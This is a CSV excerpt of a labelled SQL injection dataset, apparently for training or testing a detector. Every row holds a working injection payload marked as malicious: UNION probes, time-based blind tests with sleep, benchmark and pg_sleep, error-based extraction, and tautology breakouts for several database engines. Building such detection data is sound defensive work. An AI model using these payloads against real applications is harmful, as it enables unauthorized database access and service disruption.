row_index,payload_norm,label,sqli_type_hint
1470,"1'|| ( select 'cjwp' where 8681 = 8681 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) ||'",1,
1471,"1 ) ) ) union all select null,null,null,null,null--",1,
1472,"-4856' in boolean mode ) union all select 1074,1074,1074,1074,1074,1074,1074#",1,
1473,"-8080"" ) as nlos where 8917 = 8917 union all select 8917,8917,8917,8917--",1,
1474,select ( case when ( 7217 = 7631 ) then 7217 else 7217* ( select 7217 from information_schema.character_sets ) end ) #,1,
1475,select pg_sleep ( 5 ) and ( ( ( 'xobx' = 'xobx,1,
1476,"-8902 union all select 4339,4339,4339#",1,
1477,"elt ( 5953 = 5953,1 )",1,
1478,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'ffzv' = 'ffzv",1,
1479,-3431%' ) or 9323 = 9323#,1,
1480,"1"" ) union all select null,null,null,null,null,null,null,null,null,null--",1,
1481,1 ) as zzip where 5353 = 5353 and 3394 = 3092,1,
1482,-5774' where 3632 = 3632 or ( 3177 = 4222 ) *4222--,1,
1483,"1%"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,1,
1484,"1"" ) where 7165 = 7165 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1,
1485,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'nond' = 'nond",1,
1486,"-1617%"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,1,
1487,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""xeki"" like ""xeki",1,
1488,"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,
1489,1'+ ( select 'nlvq' where 7528 = 7528 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
1490,"1%"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,1,
1491,"1"" ) ) as brwj where 9180 = 9180",1,
1492,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
1493,-7941 or ( 5822 = 8754 ) *8754-- eepn,1,
1494,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""gydr"" like ""gydr",1,
1495,"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""%"" = """,1,
1496,1%' ) ) and ( 3020 = 3020 ) *6703 and ( ( '%' = ',1,
1497,-7758%' ) ) ) or 3038 = 3038,1,
1498,"1%"" and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
1499,"-6519' ) ) as tdlt where 5040 = 5040 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
